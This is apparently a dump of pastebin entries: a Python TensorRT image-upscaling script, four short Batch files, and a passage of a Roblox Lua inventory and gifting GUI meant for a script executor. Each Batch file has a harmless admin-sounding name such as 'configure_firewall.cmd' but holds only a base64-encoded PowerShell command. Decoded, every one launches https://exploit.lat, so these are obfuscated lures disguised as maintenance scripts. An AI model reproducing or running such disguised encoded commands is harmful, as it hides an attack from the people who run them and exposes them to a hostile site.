id,title,username,language,date,content
PvhYvy1x,Untitled,zelenooki87,Python,Friday 13th of June 2025 01:01:47 AM CDT,"import numpy as np
import tensorrt_rtx as trt
import pycuda.driver as cuda
import pycuda.autoinit
from PIL import Image, ImageFile
import cv2
import os
import time
from pathlib import Path
import rawpy
import concurrent.futures
import argparse
from tqdm.auto import tqdm
import sys
import traceback

ImageFile.LOAD_TRUNCATED_IMAGES = True

def load_image(image_path: Path):
    """"""Učitava sliku različitih formata uključujući RAW formate.""""""
    ext = image_path.suffix.lower()
    try:
        if ext in ['.arw', '.cr2', '.nef', '.dng', '.raf', '.raw']:
            with rawpy.imread(str(image_path)) as raw:
                return raw.postprocess(use_camera_wb=True, output_bps=8)
        else:
            img = Image.open(image_path)
            if img.mode != 'RGB': 
                img = img.convert('RGB')
            return np.array(img)
    except FileNotFoundError:
        print(f""Greška: Fajl nije pronađen - {image_path}"")
        return None
    except (rawpy.LibRawError, IOError, SyntaxError) as e:
        print(f""Greška pri učitavanju {image_path.name} ({type(e).__name__}): {e}"")
        return None
    except Exception as e:
        print(f""Neočekivana greška pri učitavanju {image_path.name}: {e}"")
        traceback.print_exc()
        return None

def process_image(
    image_path: Path,
    context: trt.IExecutionContext,
    bindings: list,
    d_input: cuda.DeviceAllocation,
    d_output: cuda.DeviceAllocation,
    stream: cuda.Stream,
    input_shape: tuple,
    output_shape: tuple,
    output_np_dtype: np.dtype,
    output_dir: Path,
    scale_factor: int,
    tile_size: int,
    overlap: int,
    output_format: str,
    jpg_quality: int,
    numpy_dtype: np.dtype
):
    """"""Obrađuje jednu sliku kroz TensorRT engine koristeći tiling pristup.""""""
    start_time = time.time()
    img = load_image(image_path)
    if img is None: 
        return None
    if not isinstance(img, np.ndarray) or img.ndim != 3 or img.shape[2] != 3:
        print(f""Greška: Slika {image_path.name} nije u očekivanom RGB formatu."")
        return None

    h, w = img.shape[:2]
    output_h, output_w = h * scale_factor, w * scale_factor
    output_img = np.zeros((output_h, output_w, 3), dtype=np.float32)
    weight_map = np.zeros((output_h, output_w, 3), dtype=np.float32)

    # Kreiranje Gaussian weight template za blending
    y_grid, x_grid = np.mgrid[0:tile_size, 0:tile_size].astype(np.float64)
    center = (tile_size - 1) / 2.0
    sigma = tile_size / 4.0
    weight_template = np.exp(-((x_grid - center)**2 + (y_grid - center)**2) / (2 * sigma**2))
    weight_template = np.repeat(weight_template[:, :, np.newaxis], 3, axis=2).astype(np.float32)
    scaled_tile_size = tile_size * scale_factor
    scaled_weight_template = cv2.resize(weight_template, (scaled_tile_size, scaled_tile_size), interpolation=cv2.INTER_LINEAR)

    # Priprema za tiling
    stride = tile_size - overlap
    x_tiles = (w + stride - 1) // stride
    y_tiles = (h + stride - 1) // stride
    total_tiles = max(1, x_tiles * y_tiles)
    tile_times = []

    # Alokacija HOST memorije
    h_input = cuda.pagelocked_empty(trt.volume(input_shape), dtype=numpy_dtype)
    h_output = cuda.pagelocked_empty(trt.volume(output_shape), dtype=output_np_dtype)

    with tqdm(total=total_tiles, desc=f""Pločice ({image_path.name})"", unit=""pločica"", 
              bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]', 
              leave=False) as pbar:
        for y in range(0, h, stride):
            for x in range(0, w, stride):
                tile_start_time = time.time()
                y_start, y_end = y, min(y + tile_size, h)
                x_start, x_end = x, min(x + tile_size, w)
                tile_orig = img[y_start:y_end, x_start:x_end]
                tile_h, tile_w = tile_orig.shape[:2]

                # Padding ako je potrebno
                if tile_h < tile_size or tile_w < tile_size:
                    pad_h, pad_w = tile_size - tile_h, tile_size - tile_w
                    pad_top, pad_bottom = pad_h // 2, pad_h - (pad_h // 2)
                    pad_left, pad_right = pad_w // 2, pad_w - (pad_w // 2)
                    tile = cv2.copyMakeBorder(tile_orig, pad_top, pad_bottom, pad_left, pad_right, cv2.BORDER_REFLECT_101)
                else:
                    tile = tile_orig

                try:
                    # Priprema ulaza za TensorRT
                    tile_input = tile.transpose(2, 0, 1).astype(numpy_dtype) / 255.0
                    tile_input = np.expand_dims(tile_input, axis=0)

                    if tile_input.shape != tuple(input_shape):
                        print(f""\nGreška: Oblik pločice {tile_input.shape} != očekivani {input_shape} za {image_path.name}"")
                        pbar.update(1)
                        continue

                    # Inferencija
                    np.copyto(h_input, tile_input.ravel())
                    cuda.memcpy_htod_async(d_input, h_input, stream)
                    context.execute_async_v3(stream_handle=stream.handle)
                    cuda.memcpy_dtoh_async(h_output, d_output, stream)
                    stream.synchronize()

                    # Obrada izlaza
                    tile_output_full = h_output.reshape(output_shape)
                    if tile_output_full.shape[0] == 1:
                        tile_output_full = tile_output_full[0]

                    # Konverzija u FP32 za blending ako je izlaz bio FP16
                    if tile_output_full.dtype == np.float16:
                        tile_output_full = tile_output_full.astype(np.float32)

                    tile_output_full = tile_output_full.transpose(1, 2, 0)  # CHW -> HWC

                    # Sečenje paddinga i blending
                    out_y_start, out_x_start = y_start * scale_factor, x_start * scale_factor
                    out_h_orig, out_w_orig = tile_h * scale_factor, tile_w * scale_factor

                    if tile_h < tile_size or tile_w < tile_size:
                        pad_top_scaled, pad_left_scaled = pad_top * scale_factor, pad_left * scale_factor
                        end_row, end_col = pad_top_scaled + out_h_orig, pad_left_scaled + out_w_orig
                        if end_row > tile_output_full.shape[0] or end_col > tile_output_full.shape[1]:
                            print(f""\nUpozorenje: Neispravne granice sečenja za padding {image_path.name} ({y},{x})."")
                            tile_output = tile_output_full
                        else:
                            tile_output = tile_output_full[pad_top_scaled:end_row, pad_left_scaled:end_col, :]
                    else:
                        tile_output = tile_output_full

                    out_y_end = out_y_start + tile_output.shape[0]
                    out_x_end = out_x_start + tile_output.shape[1]

                    # Provera granica
                    if out_y_end > output_img.shape[0] or out_x_end > output_img.shape[1]:
                        out_y_end = min(out_y_end, output_img.shape[0])
                        out_x_end = min(out_x_end, output_img.shape[1])
                        tile_output = tile_output[:out_y_end-out_y_start, :out_x_end-out_x_start, :]

                    # Primena težina za blending
                    current_weight = scaled_weight_template[:tile_output.shape[0], :tile_output.shape[1], :]

                    if tile_output.shape == current_weight.shape:
                        output_img[out_y_start:out_y_end, out_x_start:out_x_end] += tile_output * current_weight
                        weight_map[out_y_start:out_y_end, out_x_start:out_x_end] += current_weight
                    else:
                        print(f""\nUpozorenje: Neslaganje oblika tile/weight {image_path.name} ({y},{x})."")

                except Exception as e:
                    print(f""\nGreška pri TRT obradi pločice {image_path.name} ({y},{x}): {e}"")
                    traceback.print_exc()

                # Merenje vremena i update progress bara
                tile_time = time.time() - tile_start_time
                tile_times.append(tile_time)
                if tile_times:
                    avg_tile_time = sum(tile_times) / len(tile_times)
                    remaining_tiles = total_tiles - pbar.n - 1
                    if remaining_tiles > 0:
                        estimated_remaining_time = remaining_tiles * avg_tile_time
                        pbar.set_postfix_str(f""Avg: {avg_tile_time:.3f}s/pločica, Preostalo: {estimated_remaining_time:.1f}s"")
                    else:
                        pbar.set_postfix_str(f""Avg: {avg_tile_time:.3f}s/pločica"")
                pbar.update(1)

    # Normalizacija i čuvanje
    mask = weight_map > 1e-6
    output_img[mask] /= weight_map[mask]
    output_img = np.clip(output_img * 255.0, 0, 255).astype(np.uint8)

    output_filename = f""{image_path.stem}_upscaled_SWINIR-L-GAN.{output_format.lower()}""
    output_path = output_dir / output_filename
    try:
        output_image = Image.fromarray(output_img)
        save_params = {}
        fmt = output_format.lower()
        if fmt in ['jpg', 'jpeg']:
            save_params['quality'] = jpg_quality
            save_params['subsampling'] = 0
        elif fmt == 'png':
            save_params['compress_level'] = 4
        output_image.save(output_path, **save_params)
        elapsed_time = time.time() - start_time
        avg_tile_t = sum(tile_times) / len(tile_times) if tile_times else 0
        tqdm.write(f""Završeno: {image_path.name} -> {output_path.name} (vreme: {elapsed_time:.2f}s, avg pločica: {avg_tile_t:.3f}s)"")
        return output_path
    except Exception as e:
        print(f""\nGreška pri čuvanju {output_path.name}: {e}"")
        traceback.print_exc()
        return None


def main():
    parser = argparse.ArgumentParser(description='TensorRT Batch Upscaling.')
    parser.add_argument('--input_dir', type=str, default='input')
    parser.add_argument('--output_dir', type=str, default='output')
    parser.add_argument('--engine_path', type=str, default='scunet_color_real_gan_4600fp32rtx.trt')
    parser.add_argument('--scale_factor', type=int, default=1)
    parser.add_argument('--workers', type=int, default=1)
    parser.add_argument('--force', action='store_true')
    parser.add_argument('--tile_size', type=int, default=4600)
    parser.add_argument('--overlap', type=int, default=2000)
    parser.add_argument('--output_format', type=str, default='jpg', choices=['png', 'jpg', 'jpeg', 'bmp'])
    parser.add_argument('--jpg_quality', type=int, default=100)
    parser.add_argument('--dtype', type=str, default='float32', choices=['float16', 'float32'])
    args = parser.parse_args()

    # Provera i podešavanje broja radnika
    if args.workers == 0:
        args.workers = os.cpu_count() or 1
    print(f""Koristi se {args.workers} radnika."")
    if args.workers < 0:
        print(""Greška: Negativan broj radnika."")
        sys.exit(1)

    # Priprema putanja
    input_dir, output_dir = Path(args.input_dir), Path(args.output_dir)
    engine_path = Path(args.engine_path)
    if not input_dir.is_dir():
        print(f""Greška: Ulazni dir '{input_dir}' nije pronađen."")
        sys.exit(1)
    if not engine_path.is_file():
        print(f""Greška: Engine fajl '{engine_path}' nije pronađen."")
        sys.exit(1)
    output_dir.mkdir(parents=True, exist_ok=True)

    # Podešavanje tipa podataka
    numpy_dtype = np.float16 if args.dtype == 'float16' else np.float32
    print(f""Koristiće se {args.dtype} ({numpy_dtype.__name__}) za pripremu ulaza."")

    # Učitavanje TensorRT engine-a
    print(f""--- DEBUG: TensorRT Python verzija: {trt.__version__} ---"")
    TRT_LOGGER = trt.Logger(trt.Logger.WARNING)
    print(f""Učitavam TensorRT engine: {engine_path}"")
    engine, context = None, None
    try:
        with open(engine_path, ""rb"") as f, trt.Runtime(TRT_LOGGER) as runtime:
            engine = runtime.deserialize_cuda_engine(f.read())
        print(f""TensorRT engine uspešno učitan."")
        context = engine.create_execution_context()
        if not context:
            raise RuntimeError(""Ne mogu kreirati execution context."")
        print(""TensorRT execution context kreiran."")
    except Exception as e:
        print(f""Greška pri učitavanju engine-a/kreiranju konteksta: {e}"")
        traceback.print_exc()
        sys.exit(1)

    # Dobijanje informacija o I/O tenzorima
    input_binding_idx, output_binding_idx = -1, -1
    input_shape, output_shape = None, None
    input_name, output_name = """", """"
    input_dtype_trt, output_dtype_trt = None, None
    output_np_dtype = np.float32  # Default NumPy tip za izlaz

    print(""--- Informacije o Engine Tenzorima (TRT 10.x API) ---"")
    num_io_tensors = engine.num_io_tensors
    tensor_indices = list(range(num_io_tensors))

    for i in tensor_indices:
        name = engine.get_tensor_name(i)
        shape = engine.get_tensor_shape(name)
        dtype = engine.get_tensor_dtype(name)
        mode = engine.get_tensor_mode(name)

        print(f""Tensor {i}: Name='{name}', Shape={shape}, Dtype={dtype}, Mode={mode}"")

        if mode == trt.TensorIOMode.INPUT:
            if input_binding_idx != -1:
                print(""Upozorenje: Više ulaznih tenzora."")
            else:
                input_binding_idx = i
                input_shape = tuple(shape)
                input_name = name
                input_dtype_trt = dtype
                if len(input_shape) == 4 and (input_shape[2] != args.tile_size or input_shape[3] != args.tile_size):
                    print(f""UPOZORENJE: Veličina pločice engine-a ({input_shape[2]}x{input_shape[3]}) != --tile_size ({args.tile_size})."")
                elif len(input_shape) != 4:
                    print(f""UPOZORENJE: Ulazni oblik {input_shape} nije 4D."")
        elif mode == trt.TensorIOMode.OUTPUT:
            if output_binding_idx != -1:
                print(""Upozorenje: Više izlaznih tenzora."")
            else:
                output_binding_idx = i
                output_shape = tuple(shape)
                output_name = name
                output_dtype_trt = dtype
                # Određujemo NumPy tip na osnovu TRT tipa
                if output_dtype_trt == trt.float16:
                    output_np_dtype = np.float16
                elif output_dtype_trt == trt.int32:
                    output_np_dtype = np.int32

    if not input_name or not output_name:
        print(""Greška: Nije identifikovan ulazni/izlazni tenzor po imenu."")
        sys.exit(1)

    print(f""Identifikovan ulaz: Index={input_binding_idx}, Ime='{input_name}', Oblik={input_shape}, Tip={input_dtype_trt}"")
    print(f""Identifikovan izlaz: Index={output_binding_idx}, Ime='{output_name}', Oblik={output_shape}, Tip={output_dtype_trt} (NumPy: {output_np_dtype.__name__})"")
    print(""------------------------------------"")

    # Korekcija veličine pločice prema engine-u ako je potrebno
    if len(input_shape) == 4 and (args.tile_size != input_shape[2] or args.tile_size != input_shape[3]):
        print(f""Korigujem tile_size na {input_shape[2]}x{input_shape[3]} prema engine-u."")
        args.tile_size = input_shape[2]
    elif len(input_shape) != 4:
        print(f""Ne mogu korigovati tile_size, ulaz nije 4D."")

    # Alokacija Device Memorije
    d_input, d_output, stream, bindings = None, None, None, None
    try:
        if numpy_dtype == np.float16 and input_dtype_trt != trt.float16:
            print(f""UPOZORENJE: Ulazni dtype {numpy_dtype} != očekivani TRT dtype {input_dtype_trt}"")
        elif numpy_dtype == np.float32 and input_dtype_trt == trt.float16:
            print(f""UPOZORENJE: Ulazni dtype {numpy_dtype} != očekivani TRT dtype {input_dtype_trt}"")

        d_input_size = trt.volume(input_shape) * np.dtype(numpy_dtype).itemsize
        d_input = cuda.mem_alloc(d_input_size)
        d_output_size = trt.volume(output_shape) * np.dtype(output_np_dtype).itemsize
        d_output = cuda.mem_alloc(d_output_size)
        stream = cuda.Stream()

        # Postavljanje adresa u kontekst koristeći imena
        context.set_tensor_address(input_name, int(d_input))
        context.set_tensor_address(output_name, int(d_output))
        bindings = None  # Označavamo da ne koristimo staru listu

        print(""Device (GPU) memorija alocirana."")
        print(f""  Ulazni bafer: {d_input_size / (1024**2):.2f} MiB"")
        print(f""  Izlazni bafer: {d_output_size / (1024**2):.2f} MiB (tip: {output_np_dtype.__name__})"")

    except cuda.MemoryError:
        print(f""Greška: Nedovoljno GPU memorije!"")
        sys.exit(1)
    except Exception as e:
        print(f""Greška pri alokaciji GPU memorije: {e}"")
        traceback.print_exc()
        sys.exit(1)

    # Pronalaženje slika za obradu
    supported_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.tiff', '.tif', '.webp', '.arw', '.cr2', '.nef', '.dng', '.raf', '.raw']
    all_image_paths = []
    print(f""Pretražujem: {input_dir}"")
    for ext in supported_extensions:
        all_image_paths.extend(input_dir.glob(f'*{ext}'))
        all_image_paths.extend(input_dir.glob(f'*{ext.upper()}'))

    image_paths_to_process = []
    processed_stems = set()
    output_suffix = f""_ESC-XL-REAL-GAN.{args.output_format.lower()}""
    existing_outputs_stems = set()
    
    if not args.force:
        for f in output_dir.glob(f'*{output_suffix}'):
            existing_outputs_stems.add(f.stem.replace('_ESC-XL-REAL-GAN', ''))
        if existing_outputs_stems:
            print(f""Pronađeno {len(existing_outputs_stems)} postojećih izlaza."")

    for img_path in all_image_paths:
        stem = img_path.stem
        if stem in processed_stems:
            continue
        if not args.force and stem in existing_outputs_stems:
            continue
        processed_stems.add(stem)
        image_paths_to_process.append(img_path)

    if not image_paths_to_process:
        print(f""Nema novih slika za obradu."")
        return
    
    print(f""Pronađeno {len(image_paths_to_process)} slika za obradu."")

    # Obrada slika
    results = []
    start_overall_time = time.time()
    
    if args.workers > 1:
        print(f""Pokrećem obradu sa {args.workers} radnika..."")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {
                executor.submit(
                    process_image, img_path, context, bindings, d_input, d_output, stream, 
                    input_shape, output_shape, output_np_dtype, output_dir, args.scale_factor, 
                    args.tile_size, args.overlap, args.output_format, args.jpg_quality, numpy_dtype
                ): img_path for img_path in image_paths_to_process
            }
            
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), 
                              desc=""Ukupni napredak"", unit=""slika""):
                img_path_completed = futures[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except Exception as e:
                    tqdm.write(f""\nGREŠKA u threadu za {img_path_completed.name}: {e}"")
    else:
        print(""Pokrećem sekvencijalnu obradu..."")
        for image_path in tqdm(image_paths_to_process, desc=""Ukupni napredak"", unit=""slika""):
            try:
                result = process_image(
                    image_path, context, bindings, d_input, d_output, stream, 
                    input_shape, output_shape, output_np_dtype, output_dir, args.scale_factor, 
                    args.tile_size, args.overlap, args.output_format, args.jpg_quality, numpy_dtype
                )
                if result:
                    results.append(result)
            except Exception as e:
                tqdm.write(f""\nGREŠKA pri obradi {image_path.name}: {e}"")
                traceback.print_exc()

    # Finalni izveštaj
    end_overall_time = time.time()
    total_time = end_overall_time - start_overall_time
    num_processed = len(results)
    avg_time_per_image = total_time / num_processed if num_processed > 0 else 0
    
    print(""-"" * 30)
    print(f""Obrada završena za {total_time:.2f} s."")
    print(f""Uspešno sačuvano {num_processed} slika."")
    if num_processed > 0:
        print(f""Prosečno vreme po slici: {avg_time_per_image:.2f} s."")
    
    failed_count = len(image_paths_to_process) - num_processed
    if failed_count > 0:
        print(f""Neuspele/preskočene slike: {failed_count}"")
    
    print(f""Izlazni fajlovi u: {output_dir}"")

if __name__ == ""__main__"":
    main()"
7cRJJX8i,reset_adapter.cmd,stefanlupu,Batch,Friday 13th of June 2025 12:58:30 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0ANgBkAGUAMQAyADcAZQBhAA==

o9TYNI"
5sy5LrLq,extract_archive.bat,stefanlupu,Batch,Friday 13th of June 2025 12:48:29 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYQA1ADcAOQAxADUAZgA0AA==

NBRig2"
XbgzYyBe,fetch_logs.ps1,stefanlupu,Batch,Friday 13th of June 2025 12:38:28 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0ANQBmADMAYgA3ADcAZQA3AA==

FhGnI3"
jWhSy5f0,configure_firewall.cmd,stefanlupu,Batch,Friday 13th of June 2025 12:28:27 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AZgBhADcAMgA3ADEAYwAyAA==

uK4h1E"
PXgVRKA5,wwees,suramraja1,Lua,Thursday 12th of June 2025 11:45:02 PM CDT,"-- Inventory Price GUI for Grow A Garden
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local UserInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")
local player = Players.LocalPlayer

-- Get required modules
local CalculatePetValue = require(ReplicatedStorage.Modules:WaitForChild(""CalculatePetValue""))
local CalculatePlantValue = require(ReplicatedStorage.Modules:WaitForChild(""CalculatePlantValue""))
local DataService = require(ReplicatedStorage.Modules.DataService)

-- Helper to format numbers
local function formatNumber(n)
    if not n or type(n) ~= ""number"" then return ""$0"" end
    local sign = (n < 0) and ""-"" or """"
    local absn = math.abs(n)
    local suffix = """"
    if absn >= 1e12 then
        n = n/1e12; suffix = ""T""
    elseif absn >= 1e9 then
        n = n/1e9; suffix = ""B""
    elseif absn >= 1e6 then
        n = n/1e6; suffix = ""M""
    elseif absn >= 1e3 then
        n = n/1e3; suffix = ""K""
    end
    local i = math.floor(math.abs(n))
    local f = math.abs(n) - i
    local frac = (f > 0) and (""%.1f""):format(f):sub(2) or """"
    local s = tostring(i)
    while true do
        local count
        s, count = s:gsub(""^(-?%d+)(%d%d%d)"", ""%1,%2"")
        if count == 0 then break end
    end
    return ""$"" .. sign .. s .. frac .. suffix
end

-- Create GUI
local playerGui = player:WaitForChild(""PlayerGui"")

-- Remove existing gui if it exists
local existingGui = playerGui:FindFirstChild(""InventoryPriceGui"")
if existingGui then
    existingGui:Destroy()
end

-- State variables
local currentSortColumn = ""Price"" -- Default sort by price
local currentSortDir = ""desc"" -- Default descending (highest first)
local allItemsData = {} -- Will store all inventory items data
local isMinimized = false 
local originalSize
local sortButtons = {}
local isRefreshing = false
local lastRefreshTime = 0

-- Create main GUI
local inventoryGui = Instance.new(""ScreenGui"")
inventoryGui.Name = ""InventoryPriceGui""
inventoryGui.ResetOnSpawn = false
inventoryGui.Parent = playerGui

local mainFrame = Instance.new(""Frame"")
mainFrame.Size = UDim2.new(0, 500, 0, 400)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200) -- change size and position
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BackgroundTransparency = 0.1
mainFrame.Parent = inventoryGui
mainFrame.Active = true

-- Store original size for minimizing
originalSize = mainFrame.Size

-- Add rounded corners
local mainCorner = Instance.new(""UICorner"")
mainCorner.CornerRadius = UDim.new(0, 8)
mainCorner.Parent = mainFrame

-- Title bar
local titleBar = Instance.new(""Frame"")
titleBar.Name = ""TitleBar""
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

-- Add rounded corners to title bar (top corners only)
local titleCorner = Instance.new(""UICorner"")
titleCorner.CornerRadius = UDim.new(0, 8)
titleCorner.Parent = titleBar

-- Make sure the title bar only rounds the top corners
local bottomFrame = Instance.new(""Frame"")
bottomFrame.Size = UDim2.new(1, 0, 0.5, 0)
bottomFrame.Position = UDim2.new(0, 0, 0.5, 0)
bottomFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
bottomFrame.BorderSizePixel = 0
bottomFrame.Parent = titleBar

local titleText = Instance.new(""TextLabel"")
titleText.Name = ""Title""
titleText.Size = UDim2.new(1, -100, 1, 0)
titleText.BackgroundTransparency = 1
titleText.Text = ""Inventory Items & Prices""
titleText.Font = Enum.Font.SourceSansBold
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 18
titleText.Parent = titleBar

-- Close button
local closeButton = Instance.new(""TextButton"")
closeButton.Name = ""CloseButton""
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -30, 0, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
closeButton.Text = ""X""
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 18
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Parent = titleBar

-- Add rounded corners to close button
local closeCorner = Instance.new(""UICorner"")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeButton

-- Minimize button
local minimizeButton = Instance.new(""TextButton"")
minimizeButton.Name = ""MinimizeButton""
minimizeButton.Size = UDim2.new(0, 30, 0, 30)
minimizeButton.Position = UDim2.new(1, -65, 0, 0)
minimizeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 200)
minimizeButton.Text = ""-""
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.TextSize = 22
minimizeButton.Font = Enum.Font.SourceSansBold
minimizeButton.Parent = titleBar

-- Add rounded corners to minimize button
local minimizeCorner = Instance.new(""UICorner"")
minimizeCorner.CornerRadius = UDim.new(0, 6)
minimizeCorner.Parent = minimizeButton

-- Refresh Button
local refreshButton = Instance.new(""TextButton"")
refreshButton.Name = ""RefreshButton""
refreshButton.Size = UDim2.new(0, 100, 0, 25)
refreshButton.Position = UDim2.new(0, 10, 0, 3)
refreshButton.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
refreshButton.Text = ""Refresh""
refreshButton.TextColor3 = Color3.fromRGB(255, 255, 255)
refreshButton.TextSize = 16
refreshButton.Font = Enum.Font.SourceSansBold
refreshButton.Parent = titleBar

-- Create a UICorner for the refresh button
local refreshCorner = Instance.new(""UICorner"")
refreshCorner.CornerRadius = UDim.new(0, 4)
refreshCorner.Parent = refreshButton

-- Create a permanent username input field near refresh button
local giftPlayerFrame = Instance.new(""Frame"")
giftPlayerFrame.Name = ""GiftPlayerFrame""
giftPlayerFrame.Size = UDim2.new(0, 200, 0, 25)
giftPlayerFrame.Position = UDim2.new(0, 120, 0, 3) -- Next to refresh button
giftPlayerFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
giftPlayerFrame.BackgroundTransparency = 0.3
giftPlayerFrame.Parent = titleBar

-- Add rounded corners
local giftPlayerCorner = Instance.new(""UICorner"")
giftPlayerCorner.CornerRadius = UDim.new(0, 4)
giftPlayerCorner.Parent = giftPlayerFrame

-- Create input field
local giftPlayerInput = Instance.new(""TextBox"")
giftPlayerInput.Name = ""GiftPlayerInput""
giftPlayerInput.Size = UDim2.new(1, -10, 1, -6)
giftPlayerInput.Position = UDim2.new(0, 5, 0, 3)
giftPlayerInput.BackgroundTransparency = 1
giftPlayerInput.Text = """"
giftPlayerInput.PlaceholderText = ""Enter player name to gift""
giftPlayerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
giftPlayerInput.TextSize = 14
giftPlayerInput.Font = Enum.Font.SourceSans
giftPlayerInput.Parent = giftPlayerFrame

-- Add Debug button to find all remotes
local debugButton = Instance.new(""TextButton"")
debugButton.Name = ""DebugButton""
debugButton.Size = UDim2.new(0, 100, 0, 25)
debugButton.Position = UDim2.new(0, 330, 0, 3) -- After username field
debugButton.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
debugButton.Text = ""Debug""
debugButton.TextColor3 = Color3.fromRGB(255, 255, 255)
debugButton.TextSize = 14
debugButton.Font = Enum.Font.SourceSansBold
debugButton.Parent = titleBar

-- Add rounded corners to debug button
local debugCorner = Instance.new(""UICorner"")
debugCorner.CornerRadius = UDim.new(0, 4)
debugCorner.Parent = debugButton

-- Add notice about the fireproximityprompt function
local noticeLabel = Instance.new(""TextLabel"")
noticeLabel.Size = UDim2.new(0, 300, 0, 20)
noticeLabel.Position = UDim2.new(1, -310, 0, 5)
noticeLabel.BackgroundTransparency = 1
noticeLabel.Font = Enum.Font.SourceSansItalic
noticeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
noticeLabel.TextSize = 12
noticeLabel.Text = ""Auto-teleport gifting requires a script executor""
noticeLabel.TextXAlignment = Enum.TextXAlignment.Right
noticeLabel.Parent = titleBar

-- Add resize handle
local resizeHandle = Instance.new(""Frame"")
resizeHandle.Name = ""ResizeHandle""
resizeHandle.Size = UDim2.new(0, 20, 0, 20)
resizeHandle.Position = UDim2.new(1, -20, 1, -20)
resizeHandle.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
resizeHandle.BackgroundTransparency = 0.5
resizeHandle.Parent = mainFrame
resizeHandle.ZIndex = 10

-- Add a texture to indicate resize handle
local resizeTexture = Instance.new(""TextLabel"")
resizeTexture.Name = ""ResizeTexture""
resizeTexture.Size = UDim2.new(1, 0, 1, 0)
resizeTexture.BackgroundTransparency = 1
resizeTexture.Text = ""⇲""
resizeTexture.TextColor3 = Color3.fromRGB(200, 200, 200)
resizeTexture.TextSize = 16
resizeTexture.Font = Enum.Font.SourceSansBold
resizeTexture.Parent = resizeHandle

-- Header Frame for column titles
local headerFrame = Instance.new(""Frame"")
headerFrame.Name = ""HeaderFrame""
headerFrame.Size = UDim2.new(1, -20, 0, 35)
headerFrame.Position = UDim2.new(0, 10, 0, 40)
headerFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
headerFrame.BackgroundTransparency = 0.5
headerFrame.Parent = mainFrame

-- Add rounded corners to header frame
local headerCorner = Instance.new(""UICorner"")
headerCorner.CornerRadius = UDim.new(0, 6)
headerCorner.Parent = headerFrame

-- Scrolling Frame for item list
local scrollingFrame = Instance.new(""ScrollingFrame"")
scrollingFrame.Name = ""ScrollingFrame""
scrollingFrame.Size = UDim2.new(1, -20, 1, -105)
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundTransparency = 0.9
scrollingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
scrollingFrame.BorderSizePixel = 0
scrollingFrame.ScrollBarThickness = 8
scrollingFrame.Parent = mainFrame

-- Total price indicator
local totalFrame = Instance.new(""Frame"")
totalFrame.Name = ""TotalFrame""
totalFrame.Size = UDim2.new(1, -20, 0, 30)
totalFrame.Position = UDim2.new(0, 10, 1, -40)
totalFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
totalFrame.BackgroundTransparency = 0.5
totalFrame.Parent = mainFrame

-- Add rounded corners to total frame
local totalCorner = Instance.new(""UICorner"")
totalCorner.CornerRadius = UDim.new(0, 6)
totalCorner.Parent = totalFrame

local totalLabel = Instance.new(""TextLabel"")
totalLabel.Name = ""TotalLabel""
totalLabel.Size = UDim2.new(0.5, 0, 1, 0)
totalLabel.BackgroundTransparency = 1
totalLabel.Font = Enum.Font.SourceSansBold
totalLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
totalLabel.TextSize = 18
totalLabel.Text = ""Total Value:""
totalLabel.TextXAlignment = Enum.TextXAlignment.Left
totalLabel.Position = UDim2.new(0, 10, 0, 0)
totalLabel.Parent = totalFrame

local totalValueLabel = Instance.new(""TextLabel"")
totalValueLabel.Name = ""TotalValueLabel""
totalValueLabel.Size = UDim2.new(0.5, 0, 1, 0)
totalValueLabel.Position = UDim2.new(0.5, 0, 0, 0)
totalValueLabel.BackgroundTransparency = 1
totalValueLabel.Font = Enum.Font.SourceSansBold
totalValueLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
totalValueLabel.TextSize = 18
totalValueLabel.Text = ""$0""
totalValueLabel.TextXAlignment = Enum.TextXAlignment.Right
